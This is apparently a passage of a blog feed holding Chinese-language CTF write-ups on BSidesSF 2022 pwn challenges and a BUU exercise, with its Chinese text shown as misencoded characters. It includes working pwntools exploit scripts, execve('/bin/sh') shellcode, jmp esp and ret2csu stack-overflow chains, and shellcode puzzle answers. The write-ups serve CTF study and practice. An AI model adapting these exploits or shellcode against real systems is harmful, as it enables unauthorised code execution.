python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26128)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx </span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Be careful. How many chars you want to reapeat?\n&#x27;</span>)</span><br><span class="line">leak_addr=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">payload=shellcode.ljust(<span class="number">0x41b</span>+<span class="number">0x4</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(leak_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> buuåˆ·é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
            <tag> æ•´æ•°æº¢å‡º </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BSidesSF 2022 CTF</title>
      <link href="/posts/de6602ce.html"/>
      <url>/posts/de6602ce.html</url>
      
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡æ‰“å›½å¤–çš„æ¯”èµ›ï¼Œç”±äºå¥½å‡ é“pwné¢˜å‡ºçš„éå¸¸èŒæ–°ï¼Œæ‰€ä»¥åšèµ·æ¥æ¯”è¾ƒèˆ’æœï¼ˆæˆ‘åšå‡ºæ¥äº†ä¸‰é“shellcodeé—¯å…³å’Œä¸¤é“æ— ä¿æŠ¤çš„æ ˆé¢˜ï¼‰ã€‚å…¶ä¸­æœ‰ä¸¤é“é¢˜çš„ä»£ç æ˜¯ä¸€æ ·çš„ï¼Œä¸€ä¸ªæ˜¯32ä½çš„ï¼Œä¸€ä¸ªæ˜¯64ä½çš„ã€‚æ•´ä½“åˆ©ç”¨æ€è·¯ä¸€æ ·ï¼Œæˆ‘å°±è¯¦ç»†è¯´ä¸€ä¸‹32ä½çš„,64ä½çš„è¿™ä¸ªé¢˜åŒç†ã€‚</p><h1 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h1><p>è¿™é“é¢˜32ä½å’Œ64ä½çš„é™„ä»¶æˆ‘ä¸Šä¼ åˆ°äº†ç™¾åº¦ç½‘ç›˜ éœ€è¦çš„è¯å¯ä»¥ä¸‹è½½  <a href="https://pan.baidu.com/s/1Usr3W-rE56rAL6v1FZ9qGw?pwd=sfaj">https://pan.baidu.com/s/1Usr3W-rE56rAL6v1FZ9qGw?pwd=sfaj</a> æå–ç ï¼šsfaj</p><h2 id="ä¿æŠ¤ç­–ç•¥ï¼š"><a href="#ä¿æŠ¤ç­–ç•¥ï¼š" class="headerlink" title="ä¿æŠ¤ç­–ç•¥ï¼š"></a>ä¿æŠ¤ç­–ç•¥ï¼š</h2><img src="https://s2.loli.net/2022/06/06/sNCMezaOjPIE9TB.png" alt="image-20220604212148738" style="zoom:50%;" /><p>åªè¦çœ‹åˆ°æ²¡å¼€NXï¼Œå°±å¾€shellcodeæ–¹é¢è€ƒè™‘ã€‚</p><h2 id="æ¼æ´åˆ†æï¼š"><a href="#æ¼æ´åˆ†æï¼š" class="headerlink" title="æ¼æ´åˆ†æï¼š"></a>æ¼æ´åˆ†æï¼š</h2><p><img src="https://s2.loli.net/2022/06/06/ravABjUV8EmO3f5.png" alt="image-20220604212652290"></p><p>è¿™é‡Œç¨‹åºæ³„éœ²äº†å¥½å‡ ä¸ªåœ°å€ï¼Œå¹¶ä¸”è¿˜ç»™äº†æç¤ºï¼Œè¯´åªèƒ½è¾“å…¥16è¿›åˆ¶çš„å­—ç¬¦ã€‚ç»“åˆæç¤ºç»§ç»­å¾€ä¸‹åˆ†æã€‚</p><img src="https://s2.loli.net/2022/06/06/zrvmtiUA5u94wOF.png" alt="image-20220604212709635" style="zoom:50%;" /><p>ç¨‹åºæ­£å¸¸å¯ä»¥æ— é™æ¬¡çš„readå‡½æ•°ï¼Œæ¯æ¬¡å¯ä»¥è¾“å…¥0x40å­—èŠ‚ã€‚</p><img src="https://s2.loli.net/2022/06/06/peFn2xCfXPIG7qD.png" alt="image-20220604212728654" style="zoom: 33%;" /><p>ï¼ˆç»“åˆä¸Šå›¾ï¼‰å‘ç°è¿™ä¸ªbufå¹¶ä¸èƒ½æº¢å‡ºï¼Œä¹Ÿä¸èƒ½å¹²æ‰°åˆ°ä»»ä½•æ•°æ®ã€‚</p><img src="https://s2.loli.net/2022/06/06/lXYNKCBTd16axVh.png" alt="image-20220605184815671" style="zoom:50%;" /><p>ï¼ˆç»“åˆä¸Šå›¾ï¼‰é—®é¢˜å‡ºåœ¨v2ä¸Šé¢ï¼Œç”±äºreadæ— é™æ¬¡è¢«å¾ªç¯æ‰§è¡Œ,v2å´å§‹ç»ˆæ²¡æœ‰è¢«æ¸…é›¶ï¼Œæ„å‘³åªè¦returnä¸è¢«è§¦å‘ï¼Œv2å°±è¿™ä¸ªä¸‹æ ‡æ— é™åˆ¶ï¼Œå¯ä»¥ä¸€ç›´å¾€é«˜åœ°å€å»å†™å…¥æ•°æ®ã€‚å†çœ‹ä¸€ä¸‹decodehexè¿™ä¸ªå‡½æ•°ï¼ˆä¸‹å›¾ï¼‰</p><img src="https://s2.loli.net/2022/06/06/bBkYuNg3m21ZMFH.png" alt="image-20220604212854398" style="zoom:50%;" /><p>å‘ç°è¿™é‡Œæœ‰ä¸ªæ£€æŸ¥ï¼Œè¦ç¡®å®šæˆ‘ä»¬è¾“å…¥çš„æ•°æ®æ˜¯å¦å±äº0<del>9 a</del>f A~Fã€‚å¦‚æœä¸æ˜¯åœ¨è¿™ä¸ªèŒƒå›´çš„è¯åˆ™ä¼šè¿”å›-1ã€‚</p><p><img src="https://s2.loli.net/2022/06/06/zr6kZDycuvI7eba.png" alt="image-20220605183435486"></p><p>å¦‚æœè¿”å›-1çš„è¯ï¼Œè¿™ä¸ªä¸»å‡½æ•°å°±ä¼šé€€å‡ºäº†ï¼Œå¦åˆ™å°±å¯ä»¥æŠŠè¿™ä¸ªå­—ç¬¦å­˜åœ¨æ ˆé‡Œçš„è¿™ä¸ªä½ç½®ï¼ˆå¦‚ä¸‹å›¾ï¼‰</p><img src="https://s2.loli.net/2022/06/06/XaKo4EHBMrRnkWS.png" alt="image-20220605183958746" style="zoom:50%;" /><p>å¯ä»¥å‘ç°è¿™æ˜¯åœ¨å½“å‰å‡½æ•°çš„è¿”å›åœ°å€ä¸‹é¢ï¼ŒçŒ›ä¸€çœ‹ä¼¼ä¹æ„Ÿè§‰ä¹Ÿä¸èƒ½ä¿®æ”¹å½“å‰å‡½æ•°çš„è¿”å›åœ°å€ã€‚ä¸è¿‡è°ƒè¯•ä¸€ä¸‹å°±å‘ç°ï¼Œchallengeå‡½æ•°çš„è¿”å›åœ°å€åœ¨è¾“å…¥ç‚¹çš„ä¸‹é¢ï¼ˆè¿™å°±æ„å‘³ç€challengeå‡½æ•°çš„è¿”å›åœ°å€æ˜¯å¯ä»¥è¢«æº¢å‡ºä¿®æ”¹çš„ï¼‰ç»“åˆä¸Šé¢åˆ†æçš„ï¼Œv2æ²¡æœ‰è¢«æ¸…é›¶å¯¼è‡´äº†æ•°æ®å¯ä»¥æ— é™å¾€ä¸‹è¾“å…¥é€ æˆæº¢å‡ºã€‚</p><p><img src="https://s2.loli.net/2022/06/06/nOcv46uWkPiCIo5.png" alt="image-20220605184725900"></p><h2 id="åˆ©ç”¨æ€è·¯ï¼š"><a href="#åˆ©ç”¨æ€è·¯ï¼š" class="headerlink" title="åˆ©ç”¨æ€è·¯ï¼š"></a>åˆ©ç”¨æ€è·¯ï¼š</h2><p>ç”±äºæ²¡å¼€NXï¼Œæœ€åè·å–shellçš„æ–¹å¼è€ƒè™‘ç”¨shellcodeï¼Œä¸è¿‡shellcodeæ²¡æ³•ç¬¬ä¸€æ¬¡å°±ç›´æ¥å†™è¿›å»ï¼Œå› ä¸ºå³ä½¿æ˜¯ç”¨çº¯å­—ç¬¦çš„shellcodeï¼Œä¹Ÿæ— æ³•ç»•è¿‡æ£€æŸ¥ï¼ˆåªæœ‰åœ¨0-9 a-f A-Fä¹‹é—´æ‰èƒ½é€šè¿‡æ£€æŸ¥ï¼Œçº¯å­—ç¬¦çš„shellcodeä¼šæœ‰å…¶ä»–å­—ç¬¦)æˆ‘è€ƒè™‘è¿‡æŠŠshellcodeæ”¾åˆ°0x40çš„ä¸€æ¬¡è¾“å…¥é‡Œé¢ï¼Œç„¶åè¿ç§»è¿‡å»æ‰§è¡Œï¼Œä¸è¿‡ç”±äºreadä¸€æ¬¡åªèƒ½è¯»å…¥0x40ï¼Œè€Œç”Ÿæˆçš„shellcodeæœ‰ä¸€ç™¾äºŒåå¤šä¸ªå­—èŠ‚ï¼Œå› æ­¤è¿™ä¸ªæ–¹æ³•ä¹Ÿä¸è¡Œã€‚<strong>æœ€ç»ˆçš„æ–¹æ³•æ˜¯åŠ«æŒæ‰§è¡Œæµï¼Œå†æ‰§è¡Œä¸€æ¬¡readå‡½æ•°ï¼ˆæ§åˆ¶å‚æ•°ï¼ŒåŠ«æŒè¿”å›åœ°å€ä¸ºjmp espï¼‰æŠŠshellcodeç²¾å‡†å†™åˆ°jmp espä¸‹é¢çš„åœ°å€å³å¯è·å–shellã€‚</strong>è‡³äºå†è¾“å…¥çš„è¿™ä¸ªshellcodeæ˜¯å­—ç¬¦å‹çš„è¿˜æ˜¯å­—èŠ‚æµæ— æ‰€è°“äº†ã€‚</p><img src="https://s2.loli.net/2022/06/06/tr6YAaVousmU3c7.png" alt="image-20220605190520975" style="zoom: 50%;" /><img src="https://s2.loli.net/2022/06/06/ypfbWhX5kPmlDrE.png" alt="image-20220605190652373" style="zoom:50%;" /><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨jmp espè¿™ä¸ªæŒ‡ä»¤ï¼Ÿ</p><p>retæŒ‡ä»¤ç›¸å½“äºpop eipï¼Œå¦‚æœæ‰§è¡ŒretæŒ‡ä»¤æ—¶æ ˆé¡¶çš„å†…å®¹æ˜¯shellcodeæœºå™¨ç ï¼Œé‚£ä¹ˆå°±ä¼šæŠŠæœºå™¨ç å¼¹ç»™eipï¼Œä½†æ˜¯eipä»…ä»…è¦çš„æ˜¯ä¸€ä¸ªæŒ‡ä»¤çš„åœ°å€è€Œå·²ï¼Œä½ å´å¼¹ç»™å®ƒäº†ä¸€ä¸ªæœºå™¨ç ï¼Œå› æ­¤ç¨‹åºå°±ä¼šå´©æºƒã€‚æ‰€ä»¥éœ€è¦ç”¨jmp espï¼Œä¹Ÿå°±æ˜¯è·³è½¬åˆ°espä¸­å­˜å‚¨çš„åœ°å€å¤„ï¼ˆä¹Ÿå°±æ˜¯è·³è½¬åˆ°shellcodeçš„åœ°å€ï¼‰ï¼Œè¿›è€Œæ‰§è¡Œshellcodeã€‚</p><p>åŠ«æŒæ‰§è¡Œæµçš„åç§»æ˜¯æ€ä¹ˆå¾—åˆ°çš„ï¼Ÿ</p><p>è¿™ä¸ªé€šè¿‡IDAæ˜¯çœ‹ä¸å‡ºæ¥ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘æ¯”è¾ƒèœQAQï¼‰ï¼Œç„¶åé€šè¿‡gdbå»è°ƒè¯•ï¼Œè¾“å…¥ä¸€äº›åƒåœ¾å­—ç¬¦ï¼Œçœ‹çœ‹è¾“å…¥åˆ°å¤šå°‘çš„æ—¶å€™å¯ä»¥æº¢å‡ºåˆ°challengeçš„è¿”å›åœ°å€ã€‚</p></blockquote><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç»è¿‡è°ƒè¯•ï¼Œå†™å…¥æ ˆé‡Œçš„åœ°å€æ•°æ®æ˜¯åç€å­˜å‚¨çš„ï¼Œå› æ­¤expä¸Šå†™çš„åœ°å€åº”è¯¥åç€å†™ï¼Œå­˜å‚¨çš„æ—¶å€™å°±æ­£äº†ã€‚</strong></p><h2 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h2><p><a href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">toolsæºç </a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;tutorial-f0115733.challenges.bsidessf.net&#x27;,3232)</span></span><br><span class="line"><span class="comment">#debug(p,0x080492C7)</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">xor ebx,ebx </span></span><br><span class="line"><span class="string">push ebx</span></span><br><span class="line"><span class="string">push 0x68732f2f</span></span><br><span class="line"><span class="string">push 0x6e69622f</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">xor eax,eax</span></span><br><span class="line"><span class="string">push 11</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;ç”±äºæ ˆåœ°å€æ˜¯éšæœºçš„ï¼Œæ‰€ä»¥å†™äº†ä¸ªå‡½æ•°å°†æ¥æ”¶çš„æ ˆåœ°å€ç»™è½¬æ¢ä¸€ä¸‹&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        b=(a&gt;&gt;(i*<span class="number">8</span>))&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="built_in">sum</span>=b+<span class="built_in">sum</span>*<span class="number">16</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">sum</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;EIP from the calling function is 0x804940f and saved at &#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">10</span>),<span class="number">16</span>)</span><br><span class="line">log(<span class="string">&#x27;leak_stack_addr&#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr))</span><br><span class="line">target_stack_addr=leak_stack_addr+<span class="number">0x8</span><span class="comment">#è°ƒè¯•ä¸€ä¸‹ï¼Œè·å–è¿™ä¸ªåç§»</span></span><br><span class="line">log(<span class="string">&#x27;target_stack_addr&#x27;</span>,<span class="built_in">hex</span>(target_stack_addr))</span><br><span class="line">a=re(target_stack_addr)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>:])</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">48</span>+<span class="string">&#x27;30900408&#x27;</span>+<span class="string">&#x27;c9920408&#x27;</span>+<span class="string">&#x27;00000000&#x27;</span>+a[<span class="number">2</span>:]+<span class="string">&#x27;00001000&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/06/06/3ObNElsnd1YoCfz.png" alt="image-20220605200714258" style="zoom: 33%;" /><h1 id="Tutorial64"><a href="#Tutorial64" class="headerlink" title="Tutorial64"></a>Tutorial64</h1><p>è¿™é“é¢˜å’Œ32ä½çš„æ€è·¯æ˜¯å®Œå…¨ä¸€æ ·çš„ï¼Œä¸ä¸€æ ·çš„åœ°æ–¹æ˜¯æ‰§è¡Œreadä¼ å‚çš„æ—¶å€™è¦ç”¨ä¸€ä¸‹ret2csuã€‚</p><h2 id="EXPï¼š-1"><a href="#EXPï¼š-1" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">p,e,libc=load(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;tutorial64-98df6ee7.challenges.bsidessf.net&#x27;</span>,<span class="number">6464</span>)</span><br><span class="line"><span class="comment">#debug(p,0x40129A)</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode=asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">xor rdi,rdi</span></span><br><span class="line"><span class="string">mov rdi ,0x68732f6e69622f</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string">xor rsi,rsi</span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">re</span>(<span class="params">a</span>):</span><br><span class="line">    <span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        b=(a&gt;&gt;(i*<span class="number">8</span>))&amp;<span class="number">0xff</span></span><br><span class="line">        <span class="built_in">sum</span>=b+<span class="built_in">sum</span>*<span class="number">16</span>*<span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">sum</span>)</span><br><span class="line">pop_rdi_addr=<span class="number">0x40142b</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x401429</span></span><br><span class="line">gadget1_addr=<span class="number">0x401422</span></span><br><span class="line">gadget2_addr=<span class="number">0x401408</span></span><br><span class="line">jmp_addr=<span class="number">0x80492c9</span></span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;RIP from the calling function is 0x4013c1 and saved at &#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log(<span class="string">&#x27;leak_stack_addr&#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr))</span><br><span class="line">target_stack_addr=leak_stack_addr+<span class="number">0x80</span></span><br><span class="line">log(<span class="string">&#x27;target_stack_addr&#x27;</span>,<span class="built_in">hex</span>(target_stack_addr))</span><br><span class="line">a=re(target_stack_addr)</span><br><span class="line"><span class="built_in">print</span>(a[<span class="number">2</span>:])</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">60</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">56</span>+re(gadget1_addr)[<span class="number">2</span>:]</span><br><span class="line">payload+=<span class="string">&#x27;0000000000000000&#x27;</span><span class="comment">#rbx</span></span><br><span class="line">payload+=<span class="string">&#x27;0100000000000000&#x27;</span><span class="comment">#rbp</span></span><br><span class="line">payload+=<span class="string">&#x27;0000000000000000&#x27;</span><span class="comment">#rdi</span></span><br><span class="line">payload+=re(target_stack_addr)[<span class="number">2</span>:]<span class="comment">#rsi</span></span><br><span class="line">payload+=<span class="string">&#x27;0001000000000000&#x27;</span><span class="comment">#rdx</span></span><br><span class="line">payload+=re(read_got_addr)[<span class="number">2</span>:]</span><br><span class="line">payload+=<span class="string">&#x27;0814400000000000&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;0000000000000000&#x27;</span>*<span class="number">7</span></span><br><span class="line">payload+=<span class="string">&#x27;9c12400000000000&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/06/06/KJP2xTnkAZNQiuC.png" alt="image-20220605201640972" style="zoom: 33%;" /><h1 id="shurdles1"><a href="#shurdles1" class="headerlink" title="shurdles1"></a>shurdles1</h1><p>ç„¶åæ˜¯shellcodeé—¯å…³é¢˜ï¼Œå¯¹äºæˆ‘è¿™ç§èŒæ–°æ¥è¯´åšèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„æ€çš„ã€‚</p><p>é¢˜ç›®å°±ç»™äº†ä¸ªipå’Œportï¼Œè¿ä¸Šå»ç›´æ¥å¼€å§‹é—¯å…³ã€‚</p><img src="https://s2.loli.net/2022/06/06/Uh2oY3sAGJp1rZX.png" alt="image-20220605202310129" style="zoom: 33%;" /><h2 id="ç¬¬ä¸€å…³"><a href="#ç¬¬ä¸€å…³" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h2><img src="https://s2.loli.net/2022/06/06/igHeP8r7IaNRJxc.png" alt="image-20220605202357671" style="zoom: 50%;" /><p>è¿™ä¸ªå°±æ˜¯è®©ä½ æ˜ç¡®å†™æ³•æ ¼å¼ï¼Œç…§ç€è¾“å…¥å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rax, rax</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåœ°æ–¹.æ˜¯æ ¸å¿ƒï¼ˆè¿™ä¸ª.å›°æ‰°æˆ‘äº†å¾ˆä¹…å¾ˆä¹…ï¼Œæœ€åæ‰å‘ç°è¿™é‡Œçš„é—®é¢˜ï¼‰ï¼Œæˆ–è€…è¾“å…¥æœºå™¨ç ä¹Ÿè¡Œï¼Œä¸è¿‡æˆ‘ä¸€ç›´å†™çš„æ˜¯æ±‡ç¼–ã€‚</p><h2 id="ç¬¬äºŒå…³"><a href="#ç¬¬äºŒå…³" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h2><p><img src="/../img/image-20221007194647365.png" alt="image-20221007194647365"></p><p>è¿™ä¸€å…³æƒ³è®©ä½ è¿”å›1ï¼Œè¿™å°±æ„å‘³ç€ä½ çš„raxå¯„å­˜å™¨é‡Œè¦æ˜¯1ï¼Œç„¶åä½¿ç”¨retè¿”å›ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,1</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="ç¬¬ä¸‰å…³"><a href="#ç¬¬ä¸‰å…³" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h2><p><img src="/../img/image-20221007194632389.png" alt="image-20221007194632389"></p><p>è¿™æ¬¡æ˜¯æƒ³è®©è¿”å›å€¼æ˜¯2ï¼Œä½†æ˜¯ä¸æƒ³è®©ä½ ä½¿ç”¨retæŒ‡ä»¤æ¥å®Œæˆã€‚ç»™çš„æç¤ºæ˜¯ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨exitã€‚æŸ¥ä¸€ä¸‹ç³»ç»Ÿè°ƒç”¨å·ï¼Œç„¶åç»™rdiä¼ å‚ä¸º2ï¼Œraxæ”¾æˆ60(exitçš„ç³»ç»Ÿè°ƒç”¨å·)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,60</span><br><span class="line">mov rdi,2</span><br><span class="line">syscall</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="ç¬¬å››å…³"><a href="#ç¬¬å››å…³" class="headerlink" title="ç¬¬å››å…³"></a>ç¬¬å››å…³</h2><p><img src="https://s2.loli.net/2022/06/06/GwDtq9f7nXhjNsd.png" alt="image-20220605203440517"></p><p>è¿™æ¬¡æƒ³è®©è¿”å›å€¼ä¸º3ï¼ˆcan you exit with code 3)è¿™å¥å…¶å®æˆ‘ä¹Ÿä¸çŸ¥é“å’‹ç¿»è¯‘æ¯”è¾ƒå‡†ç¡®ï¼Œåæ­£æˆ‘è¿™å‹‰å¼ºåŠæ ¼çš„è‹±è¯­æ°´å¹³èƒ½æ˜ç™½å®ƒæ„æ€ï¼Œä½†æ˜¯æè¿°ä¸æ˜¯å¾ˆæ¸…æ¥šã€‚</p><p>åŒæ—¶ä½ ä¸å¯ä»¥ä½¿ç”¨retæˆ–è€…syscallæŒ‡ä»¤ã€‚ç»™çš„æç¤ºæ˜¯è®©ä½¿ç”¨pop å’Œjmpæ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚</p><p>retæŒ‡ä»¤ç›¸å½“äºpop ripå†è·³è½¬åˆ°ripã€‚ä¸èƒ½ä½¿ç”¨retï¼Œå°±å¯ä»¥æŠŠè¿™ä¸ªæŒ‡ä»¤æ‹†å¼€å®ç°ã€‚å…ˆpop ä¸€ä¸ªå¯„å­˜å™¨ï¼Œç„¶åå†jmpè·³è½¬è¿‡å»ï¼Œå…¶å®å°±ç­‰åŒäºretæŒ‡ä»¤äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,3</span><br><span class="line">pop rdi</span><br><span class="line">jmp rdi</span><br><span class="line">.</span><br></pre></td></tr></table></figure><img src="https://s2.loli.net/2022/06/06/wph5IjqnS7A9VJy.png" alt="image-20220605204139956" style="zoom:50%;" /><h1 id="shurdles2"><a href="#shurdles2" class="headerlink" title="shurdles2"></a>shurdles2</h1><h2 id="ç¬¬ä¸€å…³-1"><a href="#ç¬¬ä¸€å…³-1" class="headerlink" title="ç¬¬ä¸€å…³"></a>ç¬¬ä¸€å…³</h2><img src="https://s2.loli.net/2022/06/06/Z98uboqdszTUBG7.png" alt="image-20220605204233997" style="zoom:50%;" /><p>è¿™ä¸€å…³æ˜¯æƒ³è®©åœ°å€0x12345678å‡ºå´©æºƒï¼Œç»™çš„æç¤ºè¯´jmpè·³è½¬åˆ°è¿™ä¸ªåœ°å€å°±å¯ä»¥è®©å®ƒå´©æºƒäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov rax,0x12345678</span><br><span class="line">jmp rax</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="ç¬¬äºŒå…³-1"><a href="#ç¬¬äºŒå…³-1" class="headerlink" title="ç¬¬äºŒå…³"></a>ç¬¬äºŒå…³</h2><img src="https://s2.loli.net/2022/06/06/goFt8GphHWMBiDb.png" alt="image-20220605204431458" style="zoom:50%;" /><p>è¿™æ¬¡äººå®¶ä¸è®©ç”¨jmpäº†ï¼Œæƒ³è®©ç”¨retã€‚</p><p>å› ä¸ºretæ˜¯pop ripï¼Œæ‰€ä»¥æˆ‘ä»¬æå‰æŠŠè¿™ä¸ª0x12345678å‹åˆ°æ ˆé¡¶ï¼Œç„¶åretå³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push 0x12345678</span><br><span class="line">ret</span><br><span class="line">.</span><br></pre></td></tr></table></figure><h2 id="ç¬¬ä¸‰å…³-1"><a href="#ç¬¬ä¸‰å…³-1" class="headerlink" title="ç¬¬ä¸‰å…³"></a>ç¬¬ä¸‰å…³</h2><img src="https://s2.loli.net/2022/06/06/c39LyubpJG6kglx.png" alt="image-20220605204625021" style="zoom: 50%;" /><p>è¿™ä¸€å…³æƒ³è®©ä½ æŠŠå­—ç¬¦ä¸²çš„åœ°å€ä¿å­˜åœ¨ä¸€ä¸ªå¯„å­˜å™¨é‡Œï¼Œç„¶åæŠŠå¯„å­˜å™¨ä½œä¸ºè¿”å›å€¼è¿”å›äº†ã€‚</p><p><strong>æ±‡ç¼–è¯­è¨€ä¸­DBæ˜¯å®šä¹‰å•å­—èŠ‚æ•°æ®æ®µçš„æ„æ€ï¼Œç¼–è¯‘æ—¶DBåé¢çš„æ•°æ®å°†è§†ä¸ºçº¯æ•°æ®è€Œä¸æ˜¯æŒ‡ä»¤ä»£ç </strong></p><p>æŒ‰ç…§ç»™çš„æç¤ºï¼Œcallä¼šæŠŠä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹æ ˆï¼ˆ<strong>ä¹Ÿå°±æ˜¯æŠŠå­—ç¬¦ä¸²ç»™å‹æ 